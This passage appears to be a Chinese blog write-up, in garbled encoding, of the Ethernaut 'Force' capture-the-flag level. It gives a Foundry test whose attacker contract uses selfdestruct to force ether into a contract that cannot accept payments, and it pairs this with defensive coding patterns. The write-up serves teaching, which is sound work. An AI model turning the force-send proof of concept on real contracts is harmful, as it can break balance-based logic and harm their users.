class=\"line\">        // 2. å°†æ‰€æœ‰ä»¥å¤ªå¸å‘é€ç»™ recipient</span><br><span class=\"line\">        // 3. å¼ºåˆ¶å‘é€ï¼Œæ— æ³•è¢«é˜»æ­¢</span><br><span class=\"line\">        selfdestruct(recipient);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼\"><a href=\"#åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼\" class=\"headerlink\" title=\"åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼\"></a>åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼</h3><table>\n<thead>\n<tr>\n<th>æ–¹å¼</th>\n<th>å¯è¢«é˜»æ­¢</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>æ­£å¸¸è½¬è´¦</strong></td>\n<td>âœ… æ˜¯</td>\n<td>éœ€è¦ payable å‡½æ•°</td>\n</tr>\n<tr>\n<td><strong>selfdestruct</strong></td>\n<td>âŒ å¦</td>\n<td>å¼ºåˆ¶å‘é€ï¼Œæ— æ³•æ‹’ç»</td>\n</tr>\n<tr>\n<td><strong>é¢„è®¡ç®—åœ°å€</strong></td>\n<td>âŒ å¦</td>\n<td>å‘é€åˆ°æœªæ¥åœ°å€</td>\n</tr>\n<tr>\n<td><strong>çŸ¿å·¥å¥–åŠ±</strong></td>\n<td>âŒ å¦</td>\n<td>Coinbase å¥–åŠ±</td>\n</tr>\n</tbody></table>\n<h3 id=\"å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ\"><a href=\"#å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ\" class=\"headerlink\" title=\"å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ\"></a>å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨çš„æ¨¡å¼</span><br><span class=\"line\">contract BadPattern &#123;</span><br><span class=\"line\">    function criticalFunction() public &#123;</span><br><span class=\"line\">        require(address(this).balance == 0, &quot;Must be empty&quot;);</span><br><span class=\"line\">        // é€»è¾‘...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨çš„æ¨¡å¼  </span><br><span class=\"line\">contract GoodPattern &#123;</span><br><span class=\"line\">    uint256 private expectedBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function criticalFunction() public &#123;</span><br><span class=\"line\">        require(expectedBalance == 0, &quot;Expected balance must be zero&quot;);</span><br><span class=\"line\">        // é€»è¾‘...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function updateExpectedBalance(uint256 amount) private &#123;</span><br><span class=\"line\">        expectedBalance = amount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Force å…³å¡æ•™å¯¼äº†é‡è¦çš„ä»¥å¤ªå¸å¤„ç†åŸåˆ™ï¼š</p>\n<ul>\n<li>âœ… <strong>æ°¸è¿œä¸è¦ä¾èµ– <code>address(this).balance</code></strong> - å¯ä»¥è¢«å¼ºåˆ¶ä¿®æ”¹</li>\n<li>âœ… <strong>ä½¿ç”¨å†…éƒ¨çŠ¶æ€è·Ÿè¸ªä½™é¢</strong> - æ›´åŠ å®‰å…¨å¯é </li>\n<li>âœ… <strong>ç†è§£ selfdestruct çš„å¼ºåˆ¶æ€§</strong> - æ— æ³•è¢«åˆçº¦æ‹’ç»</li>\n<li>âœ… <strong>è®¾è®¡æ—¶è€ƒè™‘æ„å¤–èµ„é‡‘</strong> - å¤„ç†éé¢„æœŸçš„ä»¥å¤ªå¸</li>\n</ul>\n<p>è¿™ä¸ªçœ‹ä¼¼ç®€å•çš„æ”»å‡»æ­ç¤ºäº†ä»¥å¤ªåŠè™šæ‹Ÿæœºå±‚é¢çš„é‡è¦ç‰¹æ€§ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">ä¸Šä¸€å…³: Level 6 - Delegation</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">ä¸‹ä¸€å…³: Level 8 - Vault</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-7-Force-å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-7-Force-å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/7\">Ethernaut Level 7 - Force</a><br><strong>æ”»å‡»ç±»å‹</strong>: å¼ºåˆ¶è½¬è´¦ã€selfdestruct åˆ©ç”¨<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><ol>\n<li><strong>å‘åˆçº¦å‘é€ä»¥å¤ªå¸</strong> - è®© <code>Force</code> åˆçº¦çš„ä½™é¢å¤§äº 0</li>\n<li><strong>ç»•è¿‡æ¥æ”¶é™åˆ¶</strong> - åˆçº¦æ²¡æœ‰ payable å‡½æ•°æˆ– fallback</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Force &#123;/*</span><br><span class=\"line\">                   MEOW ?</span><br><span class=\"line\">         /\\_/\\   /</span><br><span class=\"line\">    ____/ o o \\</span><br><span class=\"line\">  /~____  =Ã¸= /</span><br><span class=\"line\"> (______)__m_m)</span><br><span class=\"line\">*/&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>å…³é”®é—®é¢˜</strong>ï¼š</p>\n<ul>\n<li>åˆçº¦å®Œå…¨ç©ºç™½ï¼Œæ²¡æœ‰ä»»ä½•å‡½æ•°</li>\n<li>æ²¡æœ‰ <code>payable</code> å‡½æ•°æˆ– <code>fallback/receive</code> å‡½æ•°</li>\n<li>æ­£å¸¸æƒ…å†µä¸‹æ— æ³•æ¥æ”¶ä»¥å¤ªå¸</li>\n</ul>\n<h3 id=\"å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•\"><a href=\"#å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•\" class=\"headerlink\" title=\"å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•\"></a>å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•</h3><p>å°½ç®¡åˆçº¦æ‹’ç»æ¥æ”¶ä»¥å¤ªå¸ï¼Œä½†æœ‰å‡ ç§æ–¹æ³•å¯ä»¥å¼ºåˆ¶å‘é€ï¼š</p>\n<ol>\n<li><strong>selfdestruct()</strong> - åˆçº¦è‡ªæ¯æ—¶å¼ºåˆ¶è½¬ç§»ä½™é¢ â­</li>\n<li><strong>é¢„è®¡ç®—åœ°å€æŒ–çŸ¿</strong> - å‘æœªæ¥åœ°å€é¢„å…ˆå‘é€ä»¥å¤ªå¸</li>\n<li><strong>Coinbase å¥–åŠ±</strong> - ä½œä¸ºçŸ¿å·¥å¥–åŠ±æ¥æ”¶åœ°å€</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// ç›®æ ‡åˆçº¦ - å®Œå…¨ç©ºç™½</span><br><span class=\"line\">contract Force &#123;</span><br><span class=\"line\">    // ç©ºåˆçº¦ï¼Œæ— æ³•æ­£å¸¸æ¥æ”¶ä»¥å¤ªå¸</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ForceAttacker &#123;</span><br><span class=\"line\">    constructor() payable &#123;</span><br><span class=\"line\">        // æ„é€ å‡½æ•°æ¥æ”¶ä»¥å¤ªå¸</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack(address payable target) public &#123;</span><br><span class=\"line\">        // ğŸ¯ å…³é”®æ”»å‡»ï¼šä½¿ç”¨ selfdestruct å¼ºåˆ¶å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        selfdestruct(target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ForceTest is Test &#123;</span><br><span class=\"line\">    Force public force;</span><br><span class=\"line\">    ForceAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user = makeAddr(&quot;user&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½² Force åˆçº¦</span><br><span class=\"line\">        force = new Force();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™ç”¨æˆ·ä¸€äº›ä»¥å¤ªå¸</span><br><span class=\"line\">        vm.deal(user, 10 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testForceExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;=== æ”»å‡»å‰çŠ¶æ€ ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Force åˆçº¦ä½™é¢:&quot;, address(force).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        attacker = new ForceAttacker&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;æ”»å‡»åˆçº¦ä½™é¢:&quot;, address(attacker).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ğŸ¯ æ‰§è¡Œæ”»å‡»ï¼šè‡ªæ¯å¹¶å¼ºåˆ¶å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        attacker.attack(payable(address(force)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== æ”»å‡»åçŠ¶æ€ ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Force åˆçº¦ä½™é¢:&quot;, address(force).balance);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»åˆçº¦ä½™é¢:&quot;, address(attacker).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertGt(address(force).balance, 0);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»æˆåŠŸï¼Force åˆçº¦ç°åœ¨æœ‰ä»¥å¤ªå¸äº†&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testNormalTransferFails() public &#123;</span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å°è¯•æ­£å¸¸å‘é€ä»¥å¤ªå¸ - åº”è¯¥å¤±è´¥</span><br><span class=\"line\">        (bool success,) = address(force).call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;æ­£å¸¸è½¬è´¦å¤±è´¥ï¼Œå¦‚é¢„æœŸ&quot;);</span><br><span class=\"line\">        assertEq(address(force).balance, 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPreComputedAddress() public &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºé¢„è®¡ç®—åœ°å€æ–¹æ³•</span><br><span class=\"line\">        address futureAddress = computeCreateAddress(user, vm.getNonce(user) + 1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å‘æœªæ¥åœ°å€å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        (bool success,) = futureAddress.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success); // åœ°å€ä¸å­˜åœ¨ï¼Œå‘é€å¤±è´¥</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;é¢„è®¡ç®—åœ°å€:&quot;, futureAddress);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•\"><a href=\"#å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•\" class=\"headerlink\" title=\"å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•\"></a>å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract AlternativeAttacks &#123;</span><br><span class=\"line\">    // æ–¹æ³• 2: é¢„è®¡ç®—åœ°å€ (å®é™…ä¸­å¾ˆéš¾å®ç°)</span><br><span class=\"line\">    function preComputedAttack() public payable &#123;</span><br><span class=\"line\">        // 1. è®¡ç®—ç›®æ ‡åˆçº¦çš„æœªæ¥éƒ¨ç½²åœ°å€</span><br><span class=\"line\">        // 2. å‘è¯¥åœ°å€å‘é€ä»¥å¤ªå¸</span><br><span class=\"line\">        // 3. åœ¨è¯¥åœ°å€éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        // æ³¨æ„ï¼šè¿™éœ€è¦æ§åˆ¶éƒ¨ç½²æ—¶æœºï¼Œå®é™…ä¸­å¾ˆå›°éš¾</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // æ–¹æ³• 3: ä½œä¸ºçŸ¿å·¥è®¾ç½® coinbase (ä»…ç†è®ºä¸Šå¯èƒ½)</span><br><span class=\"line\">    function coinbaseAttack() public &#123;</span><br><span class=\"line\">        // å¦‚æœä½ æ˜¯çŸ¿å·¥ï¼Œå¯ä»¥å°†ç›®æ ‡åœ°å€è®¾ä¸º coinbase</span><br><span class=\"line\">        // æŒ–çŸ¿å¥–åŠ±ä¼šç›´æ¥å‘é€åˆ°è¯¥åœ°å€</span><br><span class=\"line\">        // ä½†è¿™éœ€è¦å·¨å¤§çš„ç®—åŠ›æŠ•å…¥</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­\"><a href=\"#1-é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­\" class=\"headerlink\" title=\"1. é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­\"></a>1. é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract VulnerableContract &#123;</span><br><span class=\"line\">    // âŒ å±é™©ï¼šä¾èµ–åˆçº¦ä½™é¢</span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        require(address(this).balance == 0, &quot;Contract must be empty&quot;);</span><br><span class=\"line\">        // å¯è¢« selfdestruct æ”»å‡»ç»•è¿‡</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeContract &#123;</span><br><span class=\"line\">    uint256 private internalBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // âœ… å®‰å…¨ï¼šä½¿ç”¨å†…éƒ¨è®°è´¦</span><br><span class=\"line\">    function deposit() public payable &#123;</span><br><span class=\"line\">        internalBalance += msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        require(internalBalance == 0, &quot;Internal balance must be zero&quot;);</span><br><span class=\"line\">        // æ— æ³•è¢«å¤–éƒ¨å¼ºåˆ¶ä¿®æ”¹</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡\"><a href=\"#2-ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡\" class=\"headerlink\" title=\"2. ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡\"></a>2. ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureForce &#123;</span><br><span class=\"line\">    uint256 private receivedAmount;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        receivedAmount += msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getReceivedAmount() public view returns (uint256) &#123;</span><br><span class=\"line\">        return receivedAmount; // åªè®¡ç®—ä¸»åŠ¨æ¥æ”¶çš„ä»¥å¤ªå¸</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getTotalBalance() public view returns (uint256) &#123;</span><br><span class=\"line\">        return address(this).balance; // åŒ…æ‹¬å¼ºåˆ¶å‘é€çš„ä»¥å¤ªå¸</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-æ£€æŸ¥ä½™é¢å˜åŒ–\"><a href=\"#3-æ£€æŸ¥ä½™é¢å˜åŒ–\" class=\"headerlink\" title=\"3. æ£€æŸ¥ä½™é¢å˜åŒ–\"></a>3. æ£€æŸ¥ä½™é¢å˜åŒ–</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract BalanceMonitor &#123;</span><br><span class=\"line\">    uint256 private lastKnownBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier balanceCheck() &#123;</span><br><span class=\"line\">        uint256 balanceBefore = address(this).balance;</span><br><span class=\"line\">        _;</span><br><span class=\"line\">        uint256 balanceAfter = address(this).balance;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ£€æµ‹æ„å¤–çš„ä½™é¢å˜åŒ–</span><br><span class=\"line\">        if (balanceAfter != lastKnownBalance) &#123;</span><br><span class=\"line\">            emit UnexpectedBalanceChange(lastKnownBalance, balanceAfter);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        lastKnownBalance = balanceAfter;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event UnexpectedBalanceChange(uint256 expected, uint256 actual);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"selfdestruct-æœºåˆ¶\"><a href=\"#selfdestruct-æœºåˆ¶\" class=\"headerlink\" title=\"selfdestruct æœºåˆ¶\"></a>selfdestruct æœºåˆ¶</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SelfDestructExample &#123;</span><br><span class=\"line\">    constructor() payable &#123;&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function destroy(address payable recipient) public &#123;</span><br><span class=\"line\">        // selfdestruct ä¼šï¼š</span><br><span class=\"line\">        // 1. é”€æ¯åˆçº¦ä»£ç </span><br><span class=\"line\">        // 2. å°†æ‰€æœ‰ä»¥å¤ªå¸å‘é€ç»™ recipient</span><br><span class=\"line\">        // 3. å¼ºåˆ¶å‘é€ï¼Œæ— æ³•è¢«é˜»æ­¢</span><br><span class=\"line\">        selfdestruct(recipient);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼\"><a href=\"#åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼\" class=\"headerlink\" 